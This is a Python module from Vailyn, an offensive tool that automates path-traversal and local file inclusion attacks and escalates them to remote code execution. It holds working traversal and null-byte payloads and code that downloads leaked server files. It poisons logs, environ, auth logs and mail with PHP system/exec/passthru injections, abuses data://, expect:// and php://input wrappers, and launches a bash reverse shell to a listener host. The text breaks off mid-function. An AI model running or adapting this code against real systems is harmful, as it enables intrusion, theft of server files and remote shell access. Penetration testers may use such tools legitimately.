#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""


import multiprocessing
import requests
import sys
import subprocess
import base64
import psutil
import time
import json
import os

import core.variables as vars

from core.colors import color, SUCCESS, FAIL, lines

from core.variables import (
    payloadlist,
    nullchars,
    rce,
    is_windows,
    phase1_wrappers
)

from core.config import PAYLOAD_OVERRIDE

from core.methods.session import session, random_ua
from core.methods.filecheck import filecheck
from core.methods.loot import download
from core.methods.progress import progress, progress_win, progress_gui
from core.methods.cookie import dict_from_header
from core.methods.list import filegen
from core.methods.notify import notify
from core.methods.error import ShellPopException

from urllib.parse import unquote, quote

global maxlen
maxlen = len(max(payloadlist, key=len))

global nullen
nullen = len(max(nullchars, key=len))

request_count = 0

lock = multiprocessing.Lock()


def reset_counter():
    """
    reset the request counter
    """
    lock.acquire()
    try:
        global request_count
        request_count = 0
    finally:
        lock.release()


def encode64(payload):
    return base64.b64encode(payload.encode("utf-8")).decode("utf-8")


def inpath(traverse, dir, file, nb, url, url2, s):
    """
    prepare request for inpath attack
    """
    path = traverse + dir + file + nb + url2
    p = traverse + dir + file + nb
    req = requests.Request(method="GET", url=url)
    prep = s.prepare_request(req)
    prep.url = url + path
    return (prep, p)


def query(traverse, dir, file, nb, keyword, url, url2, s):
    """
    prepare request for query attack
    """
    if "?" not in url:
        query = "?" + keyword + "=" + traverse + dir + file + nb + url2
    else:
        query = "&" + keyword + "=" + traverse + dir + file + nb + url2
    p = traverse + dir + file + nb
    req = requests.Request(method="GET", url=url)
    prep = s.prepare_request(req)
    prep.url = url + query
    return (prep, p)


def post_plain(url, data, s):
    """
    prepare request for POST attacks
    """
    req = requests.Request(method="POST", url=url, data=data)
    prep = s.prepare_request(req)
    new_body = unquote(prep.body)
    prep.body = new_body
    prep.headers["content-length"] = len(new_body)
    return prep


def post_json(url, data, s):
    """
    prepare request for POST attacks
    """
    req = requests.Request(method="POST", url=url, json=data)
    prep = s.prepare_request(req)
    # new_body = unquote(prep.body)
    # prep.body = new_body
    # prep.headers["content-length"] = len(new_body)
    return prep


def fix_url(url, attack):
    """
    reformat potentially misformated URLs to the attack expectations.
    @params:
        url    - URL to format
        attack - attack ID being executed
    @return: the fixed URL
    """
    # resolve issues with inpath attack
    if attack == 2:
        # only root directory, else false positives
        splitted = url.split("://")
        ulist = splitted[1].split("/")
        last = ulist[-1]
        # delete file, but not hidden directory
        if "." in last and not last.startswith(".") and last != ulist[0]:
            del ulist[-1]
        url = splitted[0] + "://" + "/".join(ulist)
    if not url.endswith("/"):
        url += "/"

    return url


def initial_ping(s, attack, url, url2, keyword, timeout):
    """
    performs the initial requests needed for the vulnerability analysis.
    @params:
        s       - session object with saved state
        attack  - attack mode
        url     - URL part 1
        url2    - URL part 2 (for attack = 1)
        keyword - GET Parameter for attack = 1
        timeout - request timeout
    @return: response contents for later analysis
    """
    # initial ping for filecheck
    if attack not in [4, 5]:
        try:
            con2 = s.get(url, timeout=timeout).content
        except (
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
        ):
            sys.exit("Timeout on initial check.")
    else:
        try:
            con2 = s.post(url, data={}, timeout=timeout).content
        except (
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
        ):
            sys.exit("Timeout on initial check.")

    con3 = None
    if attack == 1:
        try:
            con3 = s.get(
                url + "?" + keyword + "=vailyn"
                + url2, timeout=timeout
            ).content
        except (
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
        ):
            sys.exit("Timeout on initial check.")
    elif attack == 2:
        try:
            protocol = url.split("://")[0]
            root = protocol + "://" + url.split("://")[1].split("/")[0] + "/"
            con3 = s.get(root, timeout=timeout).content
        except (
            requests.exceptions.Timeout,
            requests.exceptions.ConnectionError,
        ):
            sys.exit("Timeout on initial check.")

    return (con2, con3)


def attack_request(
    s, attack, url, url2, keyword, selected, traverse,
    file, directory, nullbyte, post_data, timeout,
    phase2=False, sheller=False, w=""
):
    """
    This method executes the attack request and returns the
    result to the caller.

    @params:
        # see caller functions
        phase2  - adapt return value to Phase 2
        sheller - adapt return value to the RCE exploitation module
    @return: tuple of useful information, varies by caller
    """
    requestlist = []
    data = {}
    if attack == 1:
        prep, p = query(
            traverse, directory, file, nullbyte,
            keyword, url, url2, s,
        )
        random_ua(s)
        r = s.send(prep, timeout=timeout)
    elif attack == 2:
        prep, p = inpath(
            traverse, directory, file, nullbyte,
            url, url2, s,
        )
        random_ua(s)
        r = s.send(prep, timeout=timeout)
    elif attack == 3:
        s.cookies.set(
            selected,
            traverse + directory + file + nullbyte,
        )
        p = traverse + directory + file + nullbyte
        random_ua(s)
        r = s.get(url, timeout=timeout)
    elif attack == 4:
        p = traverse + directory + file + nullbyte
        for prop in post_data.split("&"):
            pair = prop.split("=")
            if pair[1].strip() == "INJECT":
                pair[1] = p
            data[pair[0].strip()] = pair[1].strip()
        assert data != {}
        random_ua(s)
        prep = post_plain(url, data, s)
        r = s.send(prep, timeout=timeout)
    elif attack == 5:
        p = traverse + directory + file + nullbyte
        activated = post_data.replace("INJECT", p)
        activated = activated.replace("\\", "\\\\")
        data = json.loads(activated)
        assert data != {}
        random_ua(s)
        prep = post_json(url, data, s)
        r = s.send(prep, timeout=timeout)

    try:
        if phase2:
            requestlist.append((r, p, data))
        elif sheller:
            requestlist.append((r, p, nullbyte, data, traverse))
        else:
            requestlist.append((r, p, nullbyte, w))
    except Exception:
        pass

    return requestlist


def phase1(
    attack, url, url2, keyword, cookie, selected, verbose,
    depth, paylist, file, auth_cookie, post_data, gui
):
    """
    [Phase 1]: Vulnerability Analysis
    @params:
        attack     - attack mode (-a ACK)
        url        - target part 1 (-v VIC)
        url2       - target part 2 (-q VIC2)
        keyword    - -p PAM (only for -a 1)
        cookie     - cookiejar for -a 3
        selected   - selected cookie to be poisoned
        verbose    - print 404s?
        depth      - attack depth (-d INT)
        paylist    - payload list (all)
        file       - file to be looked up (-i FIL, default: etc/passwd)
        auth_cookie - Authentication Cookie File to bypass Login Screens
        post_data   - POST Data for --attack 4
        gui        - GUI frame to set the graphical progress bar
    """
    # variables for the progress counter
    global request_count
    precise = vars.precise

    prefixes = [""]
    if vars.lfi:
        prefixes += phase1_wrappers

    total_requests = len(payloadlist) * (len(nullchars) + 1) * len(prefixes)
    if not precise:
        total_requests = total_requests * (depth)
    timeout = vars.timeout
    if gui:
        lock.acquire()
        try:
            gui.progressBar.reset()
            gui.progressBar.setMinimum(0)
            gui.progressBar.setMaximum(total_requests)
        finally:
            lock.release()

    url = fix_url(url, attack)

    # initialize lists & session
    payloads = []
    nullbytes = []
    found_prefixes = []
    s = session()

    if auth_cookie != "":
        requests.utils.add_dict_to_cookiejar(
            s.cookies,
            dict_from_header(auth_cookie),
        )

    con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)

    for i in paylist:
        if precise:
            layers = [depth]
        else:
            layers = list(range(1, depth + 1))

        for d in layers:
            traverse = ""
            j = 1
            # chain traversal payloads
            while j <= d:
                traverse += i
                j += 1

            # send attack requests - no nullbyte injection
            requestlist = []
            for prefix in prefixes:
                combined = prefix + traverse
                try:
                    requestlist += attack_request(
                        s, attack, url, url2, keyword, selected,
                        combined, file, "", "", post_data,
                        timeout, w=prefix,
                    )
                except (
                    requests.exceptions.Timeout,
                    requests.exceptions.ConnectionError
                ):
                    print("Timeout reached for " + url)

                # repeat for nullbytes
                for nb in nullchars:
                    try:
                        requestlist += attack_request(
                            s, attack, url, url2, keyword, selected,
                            combined, file, "", nb, post_data,
                            timeout, w=prefix,
                        )
                    except (
                        requests.exceptions.Timeout,
                        requests.exceptions.ConnectionError
                    ):
                        print("Timeout reached for " + url)

            # analyze result
            found = False
            for (r, p, nb, w) in requestlist:
                lock.acquire()
                try:
                    request_count += 1
                    if gui:
                        progress_gui(request_count, total_requests, gui)
                    else:
                        if is_windows:
                            if request_count % 1000 == 0:
                                progress_win(
                                    request_count,
                                    total_requests,
                                    prefix=" ", suffix=" ",
                                )
                        else:
                            progress(
                                request_count,
                                total_requests,
                                prefix=" ", suffix=" ",
                            )
                finally:
                    lock.release()
                if str(r.status_code).startswith("2"):
                    if (
                        filecheck(r, con2, con3, p)
                        and attack not in [4, 5]
                        or filecheck(r, con2, con3, p, post=True)
                        and attack in [4, 5]
                    ):
                        payloads.append(i)
                        if nb != "":
                            nullbytes.append(nb)
                        if w != "":
                            found_prefixes.append(w)
                        found = True

                        out = color.RD + "[pl]" + color.END + color.RB
                        out = out + " " + str(r.status_code) + color.END + " "
                        out = out + "{0:{1}}".format(i, maxlen) + " "
                        out = out + "{0:{1}}".format(nb, nullen) + " " + w

                        print(out)
                if verbose and not found:
                    if attack in [1, 2]:
                        print(
                            color.END + "{0}{1}: ".format(
                                r.status_code, lines.VL,
                            ) + r.url
                        )
                    elif attack in [3, 4, 5]:
                        print(
                            color.END + "{0}{1}: ".format(
                                r.status_code, lines.VL,
                            ) + r.url + " : " + p
                        )

            if found:
                break

    return (payloads, nullbytes, found_prefixes)


def phase2(
    attack, url, url2, keyword, cookie, selected, filespath,
    dirs, depth, verbose, dl, selected_payloads,
    selected_nullbytes, selected_prefixes, auth_cookie,
    post_data, dirlen, gui
):
    """
    [Phase 2]: Exploitation
    @params:
        attack             - attack mode
        url                - target part 1
        url2               - target part 2
        keyword            - -p PAM (only for -a 1)
        cookie             - cookiejar for -a 3
        selected           - selected cookie to be poisoned
        filespath          - file list
        dirs               - directory list
        depth              - attack depth
        verbose            - print 404s?
        dl                 - download found files?
        selected_payloads  - payloads selected in phase 1
        selected_nullbytes - terminators selected in phase 1
        selected_prefixes  - PHP wrappers selected in phase 1
        auth_cookie         - Authentication Cookie File
        post_data          - POST Data for --attack 4
        dirlen             - directory dictionary size (after permutations)
        gui                - GUI frame to set the graphical progress bar
    """
    # variables for the progress counter
    global request_count
    timeout = vars.timeout
    fileslen = sum(1 for dummy in filegen(filespath))
    if len(selected_nullbytes) == 0:
        total_requests = len(selected_payloads) * fileslen * dirlen * depth
    else:
        total_requests = len(selected_payloads) * len(selected_nullbytes)
        total_requests = total_requests * fileslen * dirlen * depth
    total_requests *= len(selected_prefixes)

    if gui:
        lock.acquire()
        try:
            gui.progressBar.reset()
            gui.progressBar.setMinimum(0)
            gui.progressBar.setMaximum(total_requests)
        finally:
            lock.release()

    url = fix_url(url, attack)

    # initialize lists & session
    found = []
    urls = []
    s = session()

    if auth_cookie != "":
        requests.utils.add_dict_to_cookiejar(
            s.cookies,
            dict_from_header(auth_cookie),
        )

    con2, con3 = initial_ping(s, attack, url, url2, keyword, timeout)

    try:
        for dir in dirs:
            files = filegen(filespath)
            for file in files:
                d = 1
                while d <= depth:
                    for i in selected_payloads:
                        traverse = ""
                        j = 1
                        # chain traversal payloads
                        while j <= d:
                            traverse += i
                            j += 1

                        # send attack requests - with or without
                        # nullbyte injection
                        requestlist = []
                        for prefix in selected_prefixes:
                            combined = prefix + traverse
                            if selected_nullbytes == []:
                                try:
                                    requestlist += attack_request(
                                        s, attack, url, url2, keyword,
                                        selected, combined, file, dir, "",
                                        post_data, timeout, phase2=True,
                                    )
                                except (
                                    requests.exceptions.Timeout,
                                    requests.exceptions.ConnectionError
                                ):
                                    print("Timeout reached for " + url)
                                    continue
                            else:
                                for nb in selected_nullbytes:
                                    try:
                                        requestlist += attack_request(
                                            s, attack, url, url2, keyword,
                                            selected, combined, file, dir, nb,
                                            post_data, timeout, phase2=True,
                                        )
                                    except (
                                        requests.exceptions.Timeout,
                                        requests.exceptions.ConnectionError
                                    ):
                                        print("Timeout reached for " + url)
                                        continue

                        # analyze result
                        for (r, p, data) in requestlist:
                            lock.acquire()
                            try:
                                request_count += 1
                                if gui:
                                    progress_gui(
                                        request_count,
                                        total_requests,
                                        gui,
                                    )
                                else:
                                    if is_windows:
                                        if request_count % 1000 == 0:
                                            progress_win(
                                                request_count,
                                                total_requests,
                                                prefix=" ", suffix=" ",
                                            )
                                    else:
                                        progress(
                                            request_count,
                                            total_requests,
                                            prefix=" ", suffix=" ",
                                        )
                            finally:
                                lock.release()

                            vfound = False
                            if str(r.status_code).startswith("2"):
                                if (
                                    filecheck(r, con2, con3, p)
                                    and attack not in [4, 5]
                                    or filecheck(r, con2, con3, p, post=True)
                                    and attack in [4, 5]
                                ):
                                    vfound = True
                                    if attack in [1, 2]:
                                        print(
                                            color.RD+"[INFO]" + color.END
                                            + color.RB
                                            + " leak" + color.END + "       "
                                            + color.RD + "statvs-code"
                                            + color.END + "=" + color.RB
                                            + str(r.status_code)
                                            + color.END + " " + color.R
                                            + "site" + color.END + "="
                                            + r.url
                                        )

                                        if dl and dir + file not in found:
                                            download(
                                                r.url,
                                                dir + file,
                                                attack,
                                                s,
                                                cookie=s.cookies,
                                            )
                                        found.append(dir + file)
                                        if attack == 1:
                                            urls.append(
                                                color.RD + "[pl]"
                                                + color.END + color.RB + " "
                                                + str(r.status_code)
                                                + color.END + " "
                                                + r.url.split(
                                                    keyword + "="
                                                )[1].replace(url2, ""))
                                        else:
                                            vlnlist = r.url.split("/")[1::]
                                            vlnpath = (
                                                "/".join(i for i in vlnlist)
                                            ).replace(url2, "")
                                            urls.append(
                                                color.RD + "[pl]" + color.END
                                                + color.RB + " "
                                                + str(r.status_code)
                                                + color.END + " " + vlnpath
                                            )
                                    elif attack == 3:
                                        s.cookies.set(selected, p)
                                        print(
                                            color.RD + "[INFO]" + color.END
                                            + color.RB
                                            + " leak" + color.END + "       "
                                            + color.RD + "statvs-code"
                                            + color.END + "=" + color.RB
                                            + str(r.status_code) + color.END
                                            + " " + color.R + "cookie" +
                                            color.END + "=" + p
                                        )

                                        if dl and dir + file not in found:
                                            download(
                                                r.url,
                                                dir + file,
                                                attack,
                                                s,
                                                cookie=s.cookies,
                                            )
                                        found.append(dir + file)
                                        urls.append(
                                            color.RD + "[pl]" + color.END
                                            + color.RB + " "
                                            + str(r.status_code)
                                            + color.END + " " + p
                                        )
                                    elif attack in [4, 5]:
                                        print(
                                            color.RD + "[INFO]" + color.END
                                            + color.RB
                                            + " leak" + color.END + "       "
                                            + color.RD + "statvs-code"
                                            + color.END + "=" + color.RB
                                            + str(r.status_code) + color.END
                                            + " " + color.R + "post_data"
                                            + color.END + "=" + p
                                        )

                                        if dl and dir + file not in found:
                                            download(
                                                r.url,
                                                dir + file,
                                                attack,
                                                s,
                                                cookie=s.cookies,
                                                post=data,
                                            )
                                        found.append(dir + file)
                                        urls.append(
                                            color.RD + "[pl]" + color.END
                                            + color.RB + " "
                                            + str(r.status_code)
                                            + color.END + " " + p
                                        )

                            if verbose and not vfound:
                                if attack in [1, 2]:
                                    print(
                                        color.END + "{0}{1}: ".format(
                                            r.status_code, lines.VL,
                                        ) + r.url,
                                    )
                                elif attack in [3, 4, 5]:
                                    print(
                                        color.END + "{0}{1}: ".format(
                                            r.status_code, lines.VL,
                                        ) + r.url + " : " + p
                                    )
                    d += 1
        return (found, urls)
    except KeyboardInterrupt:
        return (found, urls)


def sheller(
    technique, attack, url, url2, keyword, cookie, selected,
    verbose, paylist, nullist, wlist,
    auth_cookie, post_data, depth, gui, app
):
    """
    second exploitation module: try to gain a
    reverse shell over the system

    @params:
        technique - technique index (see variables.rce)
    """
    # TODO clean me up
    url = fix_url(url, attack)

    s = session()
    timeout = vars.timeout

    success = None

    print(
        color.RD+"[Vailyn]" + color.END + color.RB + " LFI"
        + color.END + color.RD + lines.VL + color.END + "  "
        + color.RC + "" + color.END + color.RD
        + "" + str(rce[technique]) + color.END
    )
    if gui:
        gui.crawlerResultDisplay.append(
            "[Info] RCE{1}  Technique: {0}".format(
                str(rce[technique]), lines.VL,
            )
        )
        gui.show()
        app.processEvents()

    file = ""

    if technique == 1:
        files = [
            "/proc/self/environ",
        ]
    elif technique == 2:
        files = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/etc/httpd/logs/access_log",
            "/var/log/httpd/access_log",
            "/var/log/httpd-access.log",
        ]
    elif technique == 3:
        files = [
            "/var/log/auth.log",
            "/var/log/secure",
        ]
    elif technique == 4:
        files = [
            "/var/mail/www-data",
        ]
    elif technique == 5:
        files = [
            "/var/log/nginx/access.log",
        ]
    elif technique == 6:
        success = ["something here"]

    if auth_cookie != "":
        requests.utils.add_dict_to_cookiejar(
            s.cookies,
            dict_from_header(auth_cookie),
        )

    con2, con3 = initial_ping(
        s, attack, url, url2, keyword, timeout,
    )

    if technique != 6:
        sys.stdout.write("{0} {2} Looking for Log File:{1}".format(
            color.RD, color.END, lines.SW,
        ))
        for candidate in files:
            for i in paylist:
                d = 1
                while d <= depth:
                    traverse = ""
                    j = 1
                    # chain traversal payloads
                    while j <= d:
                        traverse += i
                        j += 1

                    # send attack requests - no nullbyte injection
                    requestlist = []
                    for prefix in wlist:
                        combined = prefix + traverse
                        if nullist == []:
                            try:
                                requestlist += attack_request(
                                    s, attack, url, url2, keyword,
                                    selected, combined, candidate, "", "",
                                    post_data, timeout, sheller=True,
                                )
                            except (
                                requests.exceptions.Timeout,
                                requests.exceptions.ConnectionError
                            ):
                                print("Timeout reached for " + url)
                        else:
                            for nb in nullist:
                                try:
                                    requestlist += attack_request(
                                        s, attack, url, url2, keyword,
                                        selected, combined, candidate, "", nb,
                                        post_data, timeout, sheller=True,
                                    )
                                except (
                                    requests.exceptions.Timeout,
                                    requests.exceptions.ConnectionError
                                ):
                                    print("Timeout reached for " + url)
                                    continue

                    # analyze result
                    found = False
                    for (r, p, nb, data, traverse) in requestlist:
                        if attack == 3:
                            s.cookies.set(selected, p)
                        if str(r.status_code).startswith("2"):
                            if (
                                filecheck(r, con2, con3, p)
                                and attack not in [4, 5]
                                or filecheck(r, con2, con3, p, post=True)
                                and attack in [4, 5]
                            ):
                                success = (r, p, nb, data, traverse)
                                found = True
                                break
                        if verbose:
                            if attack in [1, 2]:
                                print(
                                    color.END + "{0}{1}: ".format(
                                        r.status_code, lines.VL,
                                    ) + r.url
                                )
                            elif attack in [3, 4, 5]:
                                print(
                                    color.END + "{0}{1}: ".format(
                                        r.status_code, lines.VL,
                                    ) + r.url + " : " + p
                                )
                    d += 1
                    if found:
                        sys.stdout.write(
                            "{0}   {3}{2}{4}{1}\n".format(
                                color.RB,
                                color.END,
                                color.END + color.RD,
                                SUCCESS,
                                lines.VL,
                            )
                        )
                        file = candidate
                        break

    if success:
        PAYLOAD = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(
            vars.LISTENIP, vars.LISTENPORT,
        )
        if PAYLOAD_OVERRIDE:
            PAYLOAD = PAYLOAD_OVERRIDE
            PAYLOAD = PAYLOAD.replace("<IP>", vars.LISTENIP)
            PAYLOAD = PAYLOAD.replace("<PORT>", vars.LISTENPORT)
        # don't wait for shell requests to finish, so that
        # script doesn't block & shows if shell worked
        timeout2 = 3.0
        if technique != 6:
            if attack == 1:
                prep = query(
                    success[4], "", file, success[2], keyword,
                    url, url2, s,
                )[0]
            elif attack == 2:
                prep = inpath(
                    success[4], "", file, success[2], url,
                    url2, s,
                )[0]
            elif attack == 3:
                s.cookies.set(selected, success[1])
                req = requests.Request(method="GET", url=url)
                prep = s.prepare_request(req)
            elif attack == 4:
                prep = post_plain(url, success[3], s)
            elif attack == 5:
                prep = post_json(url, success[3], s)

        if technique == 1:
            user_agents = {
                "system():      ": '<?php system("{}"); ?>'.format(PAYLOAD),
                "exec():        ": '<?php exec("{}"); ?>'.format(PAYLOAD),
                "passthru():    ": '<?php passthru("{}"); ?>'.format(PAYLOAD),
            }
            for name, value in user_agents.items():
                prep.headers["User-agent"] = value
                sys.stdout.write("{0}  : Trying {2}{1}".format(
                    color.RD, color.END, name,
                ))
                if gui:
                    gui.crawlerResultDisplay.append(
                        "  : Trying {}".format(name)
                    )
                    gui.show()
                    app.processEvents()
                try:
                    s.send(prep, timeout=timeout2)
                    show_status(gui)
                    if app:
                        app.processEvents()
                except (
                    requests.exceptions.Timeout,
                    requests.exceptions.ConnectionError,
                ):
                    show_status(gui, timeout=True)
                    if app:
                        app.processEvents()

        elif technique == 2 or technique == 5:
            url_paths = {
                "system():      ": '<?php system("{}"); ?>'.format(PAYLOAD),
                "exec():        ": '<?php exec("{}"); ?>'.format(PAYLOAD),
                "passthru():    ": '<?php passthru("{}"); ?>'.format(PAYLOAD),
            }
            req = requests.Request(method="GET", url=url)
            prep2 = s.prepare_request(req)
            for name, value in url_paths.items():
                prep2.url = url + "/" + value
                sys.stdout.write("{0}  : Trying {2}{1}".format(
                    color.RD, color.END, name,
                ))
                if gui:
                    gui.crawlerResultDisplay.append(
                        "  : Trying {}".format(name),
                    )
                    gui.show()
                    app.processEvents()
                try:
                    s.send(prep2, timeout=timeout)
                    s.send(prep, timeout=timeout2)
                    show_status(gui)
                    if app:
                        app.processEvents()
                except (
                    requests.exceptions.Timeout,
                    requests.exceptions.ConnectionError,
                ):
                    show_status(gui, timeout=True)
                    if app:
                        app.processEvents()

        elif technique == 3:
            tmp = url.split("://")[1]
            if "@" in tmp:
                tmp = tmp.split("@")[1]
            host = tmp.split("/")[0].split(":")[0]
            sshs = [
                '<?php system($_GET["cmd"]); ?>@{}'.format(host),
                '<?php exec($_GET["cmd"]); ?>@{}'.format(host),
                '<?php passthru($_GET["cmd"]); ?>@{}'.format(host),
            ]
            ssht = [
                "system():      ",
                "exec():        ",
                "passthru():    "
            ]
            for i in range(0, len(sshs)):
                sys.stdout.write("{0}  : Trying {2}{1}".format(
                    color.RD, color.END, ssht[i]
                ))
                if gui:
                    gui.crawlerResultDisplay.append(
                        "  : Trying {}".format(ssht[i])
                    )
                    gui.show()
                    app.processEvents()
                try:
                    if is_windows:
                        with open(os.devnull, "w") as DEVNULL:
                            subprocess.Popen(
                                [
                                    "plink",
                                    "-ssh", host,
                                    "-l", sshs[i].split("@")[0],
                                    "-pw", "toor",
                                ],
                                stdout=DEVNULL,
                                stderr=subprocess.STDOUT,
                            )
                    else:
                        with open(os.devnull, "w") as DEVNULL:
                            subprocess.Popen(
                                [
                                    "sshpass",
                                    "-p", "toor",
                                    "ssh", sshs[i],
                                ],
                                stdout=DEVNULL,
                                stderr=subprocess.STDOUT,
                            )
                except Exception as e:
                    show_status(gui, exception=e)
                    if app:
                        app.processEvents()
                try:
                    splitted = prep.url.split("#")
                    if "?" in splitted[0]:
                        splitted[0] += "&cmd={}".format(
                            quote(PAYLOAD)
                        )
                    else:
                        splitted[0] += "?cmd={}".format(
                            quote(PAYLOAD)
                        )
                    prep.url = "#".join(part for part in splitted)
                    s.send(prep, timeout=timeout2)
                    show_status(gui)
                    if app:
                        app.processEvents()
                except (
                    requests.exceptions.Timeout,
                    requests.exceptions.ConnectionError,
                ):
                    show_status(gui, timeout=True)
                    if app:
                        app.processEvents()

        elif technique == 4:
            tmp = url.split("://")[1]
            if "@" in tmp:
                tmp = tmp.split("@")[1]
            topics = [
                'I<3shells <?php system("{}"); ?>'.format(PAYLOAD),
                'I<3shells <?php exec("{}"); ?>'.format(PAYLOAD),
                'I<3shells <?php passthru("{}"); ?>'.format(PAYLOAD)
            ]
            topict = [
                "system():      ",
                "exec():        ",
                "passthru():    "
            ]
            host = tmp.split("/")[0].split(":")[0]
            for i in range(0, len(topics)):
                sys.stdout.write("{0}  : Trying {2}{1}".format(
                    color.RD,
                    color.END,
                    topict[i]
                ))
                if gui:
                    gui.crawlerResultDisplay.append(
                        "  : Trying {}".format(topict[i])
                    )
                    gui.show()
                    app.processEvents()
                try:
                    p = subprocess.Popen(
                        ["echo", "Uno reverse shell"],
                        stdout=subprocess.PIPE,
                    )
                    subprocess.call(
                        [
                            "mail",
                            "-s", topics[i],
                            "www-data@{}".format(host)
                        ],
                        stdin=p.stdout,
                    )
                except Exception as e:
                    show_status(gui, exception=e)
                    if app:
                        app.processEvents()
                try:
                    s.send(prep, timeout=timeout2)
                    show_status(gui)
                    if app:
                        app.processEvents()
                except (
                    requests.exceptions.Timeout,
                    requests.exceptions.ConnectionError
                ):
                    show_status(gui, timeout=True)
                    if app:
                        app.processEvents()

        elif technique == 6:
            nullbyte_used = ""
            if nullist:
                nullbyte_used = nullist[0]
            systemp = '<?php system("{}"); ?>'.format(PAYLOAD)
            execp = '<?php exec("{}"); ?>'.format(PAYLOAD)
            passp = '<?php passthru("{}"); ?>'.format(PAYLOAD)
            wrappersPart1 = [
                'expect://{}'.format(quote(PAYLOAD)),
                'data://text/plain,{}'.format(
                    quote(systemp),
                ),
                'data://text/plain,{}'.format(
                    quote(execp),
                ),
                'data://text/plain,{}'.format(
                    quote(passp),
                ),
                'data://text/plain;base64,' + quote(encode64(
                    '<?php system("{}"); ?>'.format(PAYLOAD)
                )),
                'data://text/plain;base64,' + quote(encode64(
                    '<?php exec("{}"); ?>'.format(PAYLOAD)
                )),
                'data://text/plain;base64,' + quote(encode64(
                    '<?php passthru("{}"); ?>'.format(PAYLOAD)
                )),
            ]

            namesPart1 = [
                "expect:               ",
                "data.plain.system():  ",
                "data.plain.exec():    ",
                "data.plain.passthru():",
                "data.ncode.system():  ",
                "data.ncode.exec():    ",
                "data.ncode.passthru():",
            ]

            for i in range(0, len(wrappersPart1)):
                wrapper = wrappersPart1[i]
                sys.stdout.write("{0}  : {2}{1}".format(
                    color.RD, color.END, namesPart1[i]
                ))
                if gui:
                    gui.crawlerResultDisplay.append(
                        "  : {}".format(namesPart1[i])
                    )
                    gui.show()
                    app.processEvents()
                if attack == 1:
                    prep = query(
                        "", "", wrapper, nullbyte_used, keyword,
                        url, url2, s,
                    )[0]
                elif attack == 2:
                    prep = inpath(
                        "", "", wrapper, nullbyte_used, url,
                        url2, s,
                    )[0]
                elif attack == 3:
                    s.cookies.set(selected, wrapper + nullbyte_used)
                    req = requests.Request(method="GET", url=url)
                    prep = s.prepare_request(req)
                elif attack == 4:
                    data = {}
                    for prop in post_data.split("&"):
                        pair = prop.split("=")
                        if pair[1].strip() == "INJECT":
                            pair[1] = wrapper.strip() + nullbyte_used
                        data[pair[0].strip()] = pair[1].strip()
                    assert data != {}
                    random_ua(s)
                    prep = post_plain(url, data, s)
                elif attack == 5:
                    activated = post_data.replace(
                        "INJECT", wrapper + nullbyte_used
                    )
                    activated = activated.replace("\\", "\\\\")
                    data = json.loads(activated)
                    assert data != {}
                    random_ua(s)
                    prep = post_json(url, data, s)
                try:
                    s.send(prep, timeout=timeout2)
                    show_status(gui)
                    if app:
                        app.processEvents()
                except (
                    requests.exceptions.Timeout,
                    requests.exceptions.ConnectionError
                ):
                    show_status(gui, timeout=True)
                    if app:
                        app.processEvents()

            wrapper = "pHP://iNPuT"
            payloads = [
                '<?php system("{}"); ?>'.format(PAYLOAD),
                '<?php exec("{}"); ?>'.format(PAYLOAD),
                '<?php passthru("{}"); ?>'.format(PAYLOAD),
            ]
            names = [
                "input.system():       ",
                "input.exec():         ",
                "input.passthru():     ",
            ]
            for i in range(0, len(payloads)):
                sys.stdout.write("{0}  : {2}{1}".format(
                    color.RD, color.END, names[i]
                ))
                if gui:
                    gui.crawlerResultDisplay.append(
                        "  : Trying {}".format(names[i])
                    )
                    gui.show()
                    app.processEvents()
                if attack == 1:
                    if "?" not in url:
                        cont = "?" + keyword + "=" + wrapper
                        cont = cont + nullbyte_used + url2
                    else:
                        cont = "&" + keyword + "=" + wrapper
                        cont = cont + nullbyte_used + url2
                    req = requests.Request(
                        method="POST",
                        url=url + cont,
                        data=payloads[i]
                    )
                    prep = s.prepare_request(req)
                elif attack == 3:
                    s.cookies.set(selected, wrapper + nullbyte_used)
                    req = requests.Request(
                        method="POST",
                        url=url + cont,
                        data=payloads[i]
                    )
                    prep = s.prepare_request(req)
                else:
                    prep = None

                if prep:
                    try:
                        s.send(prep, timeout=timeout2)
                        show_status(gui)
                        if app:
                            app.processEvents()
                    except (
                        requests.exceptions.Timeout,
                        requests.exceptions.ConnectionError
                    ):
                        show_status(gui, timeout=True)
                        if app:
                            app.processEvents()
                else:
                    show_status(
                        gui,
                        exception="Attack vector not supported."
                    )
                    if app:
                        app.processEvents()
    else:
        sys.stdout.write("{0}   {3}{2}{4}{1}\n".format(
            color.RB, color.END, color.END + color.RD,
            FAIL, lines.VL,
        ))
        if gui:
            gui.crawlerResultDisplay.append(" FAIL\n")
            gui.show()
            app.processEvents()


def lfi_rce(
    techniques, attack, url, url2, keyword, cookie,
    selected, verbose, paylist, nullist,
    wlist, auth_cookie, post_data, depth, gui=None, app=None
):
    """
    invoke sheller() for each technique
    @params:
        techniques - list of attack techniques to use
        gui        - GUI Window to print output to
        (see other methods)
    """
    print()
    if gui and app:
        gui.crawlerResultDisplay.setText("")
        gui.show()
        app.processEvents()
    for technique in techniques:
        sheller(
            technique, attack, url, url2, keyword, cookie,
            selected, verbose, paylist, nullist,
            wlist, auth_cookie, post_data, depth, gui, app
        )


def show_status(gui, timeout=False, exception=None):
    """
    print status of RCE probe
    """
    if exception:
        sys.stdout.write("{0}  {3}!{2}{4}{1}\n".format(
            color.RB, color.END, color.END + color.RD,
            FAIL, lines.VL,
        ))
        print("{0}Exception:{1}\n{2}".format(
            color.RB, color.END, exception
        ))
        if gui:
            gui.crawlerResultDisplay.append(
                " FAIL\nException:\n{}\n".format(exception)
            )
            gui.show()
        return
    if timeout:
        if check_conn():
            # single threaded server times out when
            # shell drops
            sys.stdout.write("{0}   {3}{2}{4}{1}\n".format(
                color.RB,
                color.END,
                color.END + color.RD,
                SUCCESS,
                lines.VL,
            ))
            notify(
                "Reverse Shell arrived on Port {}.".format(
                    vars.LISTENPORT
                )
            )
            if gui:
                gui.crawlerResultDisplay.append(" PWN\n")
                gui.show()
            raise ShellPopException("pwnd")
        else:
